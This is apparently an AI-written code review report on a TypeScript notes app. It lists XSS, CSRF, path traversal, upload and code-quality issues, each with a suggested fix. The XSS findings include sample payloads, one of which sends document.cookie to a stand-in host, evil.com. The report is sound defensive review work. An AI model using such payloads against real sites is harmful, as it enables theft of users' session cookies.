# Glint Code Review Report

**Review Date**: 2026-01-23 (Updated)
**Reviewer**: Claude Code (Opus 4.5)
**Scope**: Full codebase review with focus on recent changes

---

## Executive Summary

This review identified **20 issues** across security, architecture, and code quality concerns. The most critical findings are **XSS vulnerabilities** in client-side rendering and missing **CSRF protection** on state-changing API endpoints.

| Severity | Count | Description |
|----------|-------|-------------|
| P0 (Critical) | 5 | XSS vulnerabilities, missing CSRF |
| P1 (High) | 5 | Path traversal, race conditions, security weaknesses |
| P2 (Medium) | 5 | Type safety, error handling, validation |
| P3 (Low) | 5 | Code quality, consistency, maintainability |

### Recent Improvements (Fixed Since Last Review)

The following issues from the previous review have been addressed:

- [x] XSS in page title rendering (`src/renderer.ts`) - Fixed with `escapeHtml()`
- [x] Incomplete code path in editor sessions - Removed dead code
- [x] Debug logging in production server - Removed hooks
- [x] Untyped shareService parameter - Now properly typed
- [x] Excessive `any` in widget handlers - Added proper MDAST/HAST types
- [x] Missing git error handling - Now surfaces errors via SSE toasts
- [x] File watcher race condition - Now debounced (300ms)
- [x] Hardcoded theme list - Extracted to `AVAILABLE_THEMES` constant
- [x] GlintEditor declared as `any` - Proper type declarations added
- [x] Empty setupEventListeners() - Removed
- [x] Unused contentDir parameter - Now used for getConfigPath()
- [x] No validation on task toggle API - Zod validation added
- [x] Silent catch in storage exists() - Now logs unexpected errors
- [x] Hard-coded config path in theme update - Uses getConfigPath()
- [x] Memory leak in editor Vim commands - Static registration with cleanup

---

## Critical Issues (P0)

### 1. XSS Vulnerability in Comment Widget

**File**: `src/widgets/comment.ts:94-126`
**Confidence**: 95%

User-generated content (author names, snippets, timestamps) is interpolated directly into HTML without sanitization.

```typescript
// Lines 94-108 - Unescaped snippet
html += `<span class="comment-header-snippet">${snippet}</span>`;

// Lines 125-126 - Unescaped author and timestamp
html += `<div class="comment-meta"><span class="comment-author">${msg.author}</span>...`;
```

**Attack Vector**: Malicious markdown content:
```markdown
` ``comment
<img src=x onerror=alert(document.cookie)>@2026-01-23:12:00 malicious content
` ``
```

**Fix**: Import and use `escapeHtml` from `src/utils/html.ts`:
```typescript
import { escapeHtml } from '../utils/html.js';

html += `<span class="comment-header-snippet">${escapeHtml(snippet)}</span>`;
html += `<span class="comment-author">${escapeHtml(msg.author)}</span>`;
```

---

### 2. XSS Vulnerability in Share Modal

**File**: `src/client/share.ts:27-29, 144-164`
**Confidence**: 92%

Share labels and toast messages are inserted via `innerHTML` without escaping.

```typescript
// Line 27-29 - Toast messages
toast.innerHTML = `
    <span class="toast-message">${message}</span>
`;

// Line 154 - Share labels
shareList.innerHTML = shares.map(share => {
    return `<span class="share-label-text">${share.label || 'Untitled Share'}</span>`;
}).join('');
```

**Fix**: Create a client-side escape function or use `textContent`:
```typescript
function escapeHtml(text: string): string {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}
```

---

### 3. XSS Vulnerability in Task View

**File**: `src/client/task-view.ts:260-300`
**Confidence**: 90%

Task descriptions from markdown files are rendered without escaping.

```typescript
// Line 291
<a href="${link}" class="glint-task-content">${task.description}</a>
```

**Attack Vector**: Malicious task in markdown:
```markdown
- [ ] <img src=x onerror=fetch('https://evil.com?c='+document.cookie)>
```

---

### 4. XSS Vulnerability in Journal View

**File**: `src/client/journal-view.ts:40-55`
**Confidence**: 88%

Journal entry content is rendered via innerHTML without escaping:

```typescript
html += `<div class="journal-snippet">${entry.snippet}</div>`;
```

---

### 5. Missing CSRF Protection

**File**: `src/server/routes/api.ts:138-181, 221-298`
**Confidence**: 85%

State-changing endpoints (`/api/save`, `/api/upload`, `/api/shares`, `/api/task/toggle`) lack CSRF token validation. While `sameSite: 'lax'` cookies provide partial protection, they don't defend against all attack vectors.

**Impact**: Attackers can trick authenticated users into making unintended requests.

**Fix**: Implement CSRF token middleware:
```typescript
// Generate token on auth
const csrfToken = crypto.randomBytes(32).toString('hex');
request.session.csrfToken = csrfToken;

// Validate on POST/PUT/DELETE
const clientToken = request.headers['x-csrf-token'];
if (clientToken !== request.session.csrfToken) {
    return reply.code(403).send({ error: 'Invalid CSRF token' });
}
```

---

## High Priority Issues (P1)

### 6. Path Traversal Risk in Storage Providers

**Files**: `src/storage/local.ts:26-33`, `src/storage/git.ts:52-58`
**Confidence**: 82%

The `resolvePath()` method checks that paths stay within `basePath`, but symlinks or Windows path edge cases could potentially bypass this.

```typescript
private resolvePath(relativePath: string): string {
    const resolved = path.resolve(this.basePath, relativePath);
    if (!resolved.startsWith(this.basePath)) {
        throw new Error('Access denied: Path outside base directory');
    }
    return resolved;
}
```

**Fix**: Add symlink resolution and normalize paths:
```typescript
private resolvePath(relativePath: string): string {
    const normalized = path.normalize(relativePath).replace(/^(\.\.(\/|\\|$))+/, '');
    const resolved = path.resolve(this.basePath, normalized);
    const realBase = fs.realpathSync(this.basePath);
    if (!resolved.startsWith(realBase + path.sep) && resolved !== realBase) {
        throw new Error('Access denied: Path outside base directory');
    }
    return resolved;
}
```

---

### 7. SSE Connection Memory Leak

**File**: `src/server/sse.ts:6-17`
**Confidence**: 88%

SSE clients are tracked in a Set but dead connections may accumulate if the `close` event doesn't fire properly.

**Fix**: Add heartbeat and error handling:
```typescript
const heartbeat = setInterval(() => {
    try {
        reply.raw.write(':heartbeat\n\n');
    } catch (err) {
        clearInterval(heartbeat);
        clients.delete(reply);
    }
}, 30000);

request.raw.on('error', () => {
    clearInterval(heartbeat);
    clients.delete(reply);
});
```

---

### 8. Weak Optimistic Locking

**File**: `src/server/routes/api.ts:154-167`
**Confidence**: 83%

The hash check for preventing edit conflicts is optional and uses MD5:

```typescript
if (body.hash) {  // Optional!
    const existingHash = crypto.createHash('md5').update(existingContent).digest('hex');
}
```

**Fix**: Make hash checking mandatory and use SHA-256.

---

### 9. Missing Upload Validation

**File**: `src/server/routes/api.ts:221-298`
**Confidence**: 85%

File uploads lack validation for:
- File type/extension whitelist
- Maximum file size
- Malicious content (especially SVG with embedded scripts)

```typescript
const ext = path.extname(filename) || '.png';  // No validation!
```

**Fix**:
```typescript
const ALLOWED_IMAGE_TYPES = ['.png', '.jpg', '.jpeg', '.gif', '.webp'];
const MAX_IMAGE_SIZE = 10 * 1024 * 1024; // 10MB

const ext = path.extname(filename).toLowerCase();
if (!ALLOWED_IMAGE_TYPES.includes(ext)) {
    return reply.code(400).send({ error: 'Invalid file type' });
}
```

---

### 10. Git Commit Debounce Race Condition

**File**: `src/storage/git.ts:174-194`
**Confidence**: 80%

The `pendingCommit` flag check at the start of `scheduleCommit()` can cause writes to be missed:

```typescript
private scheduleCommit(): void {
    if (this.pendingCommit) return;  // Second write during pending is ignored
    this.pendingCommit = true;
    // ...
}
```

**Fix**: Always reset the timer on new writes, regardless of pending state.

---

## Medium Priority Issues (P2)

### 11. Excessive `any` Type Usage

**Files**: 28 files with 77 occurrences
**Confidence**: 100%

Despite recent improvements, widespread use of `any` remains.

**Top offenders**:
- `src/client/editor.ts` - 8 occurrences
- `src/storage/git-utils.ts` - 8 occurrences
- `src/client/editor-sessions.ts` - 6 occurrences
- `src/server/routes/documents.ts` - 6 occurrences

---

### 12. Inconsistent Error Response Format

**Files**: API routes
**Confidence**: 88%

Error responses vary in format:
```typescript
reply.code(400).send({ error: 'Message' });      // Object
reply.code(404).send('Not Found');               // String
reply.code(500).send({ error: 'Failed', details: err });  // Object with details
```

**Fix**: Standardize with an error response helper.

---

### 13. Missing Request Body Validation

**Files**: Various API routes
**Confidence**: 85%

While `src/server/routes/tasks.ts` now uses Zod validation, other routes still use unsafe type assertions:

```typescript
// src/server/routes/api.ts:139
const body = request.body as { path: string; content: string; hash?: string };
```

---

### 14. File Tree Rebuild Could Miss Updates

**File**: `src/server.ts:181-193`
**Confidence**: 75%

While debouncing was added (good!), if a rebuild is in progress when new changes occur, those changes won't trigger a new rebuild.

**Fix**: Track rebuild state and queue pending rebuilds.

---

### 15. Toast HTML Not Escaped in Scripts

**File**: `src/renderer/scripts.ts:59-62`
**Confidence**: 85%

The global toast function uses innerHTML with potentially user-controlled message content from SSE:

```typescript
toast.innerHTML = \`
    <span class="toast-message">\${message}</span>
\`;
```

While the message currently comes from error.message, this should be escaped.

---

## Low Priority Issues (P3)

### 16. Console.log in Production Code

**Files**: Multiple client files
**Confidence**: 100%

Debug logging statements remain:
- `src/client/editor-sessions.ts:109,115,240,246`
- `src/renderer/scripts.ts:100,104`

---

### 17. Magic Numbers

**Files**: Multiple
**Confidence**: 95%

Hardcoded values without explanation:
- `2000` ms debounce in `git.ts:193`
- `300` ms debounce in `server.ts:185`
- `5` line buffer in `editor-sessions.ts:139`

**Fix**: Extract to named constants.

---

### 18. Duplicate Code in Storage Providers

**Files**: `src/storage/local.ts`, `src/storage/git.ts`
**Confidence**: 95%

Both providers have nearly identical implementations for file operations.

**Fix**: Extract common logic to a base class.

---

### 19. Missing JSDoc on Public APIs

**Files**: Most exported functions
**Confidence**: 100%

Public APIs lack documentation.

---

### 20. Redundant Git Method Wrappers

**File**: `src/storage/index.ts:278-320`
**Confidence**: 90%

Four nearly identical methods for git operations with repeated error checking.

**Fix**: Create a single `getGitProvider()` helper.

---

## Architecture Recommendations

### Immediate Actions (This Week)

1. **Fix XSS vulnerabilities** (P0) - Add `escapeHtml` to all user content rendering
2. **Implement CSRF protection** (P0) - Add token-based validation
3. **Add upload validation** (P1) - Whitelist file types, check sizes
4. **Fix SSE memory leak** (P1) - Add heartbeat mechanism

### Short-term Improvements (This Month)

1. **Eliminate remaining `any` types** - Target the 77 occurrences
2. **Standardize error handling** - Create error response utilities
3. **Add input validation** - Apply Zod schemas to all API endpoints
4. **Extract storage base class** - Reduce code duplication

### Long-term Goals

1. **Security scanning** - Add ESLint security plugin, run npm audit
2. **API documentation** - Generate OpenAPI spec from route definitions
3. **Test coverage** - Add tests for security-critical paths

---

## Files Changed Since Last Review

| File | Status | Changes |
|------|--------|---------|
| `src/server.ts` | Improved | Debounced file tree rebuild, SSE error forwarding, removed debug hooks |
| `src/storage/git.ts` | Improved | Added onError callback, improved error propagation |
| `src/storage/index.ts` | Improved | Error handler registration, better error logging |
| `src/client/editor.ts` | Improved | Fixed Vim memory leak with static registration |
| `src/client/editor-sessions.ts` | Improved | Proper type declarations, removed dead code |
| `src/server/routes/api.ts` | Improved | Uses getConfigPath for theme updates |
| `src/server/routes/tasks.ts` | Improved | Zod validation for task toggle |
| `src/widgets/task.ts` | Improved | Proper MDAST/HAST types |
| `src/widgets/types.ts` | Improved | Added CustomTextNode, HASTElement types |
| `src/renderer/scripts.ts` | Improved | Added error toast for SSE |
| `src/renderer/sidebar.ts` | Improved | Uses AVAILABLE_THEMES constant |
| `src/config.ts` | Improved | Exports AVAILABLE_THEMES |
| `src/client/types.ts` | Improved | GlintEditor type declarations |
| `src/client/task-view.ts` | Improved | Removed empty method |

---

## Summary

The codebase has improved significantly since the last review:
- **15 issues fixed** from the previous review
- Better type safety with proper MDAST/HAST and GlintEditor types
- Improved error handling with SSE error surfacing
- Race conditions addressed with debouncing

However, **security hardening remains the top priority**:
- XSS vulnerabilities in client-side widgets need immediate attention
- CSRF protection should be implemented
- Upload validation is missing

The `escapeHtml` utility exists in `src/utils/html.ts` but is not used consistently. A client-side equivalent should be created and used throughout the client code.

**Next Review**: Schedule after security fixes are implemented.
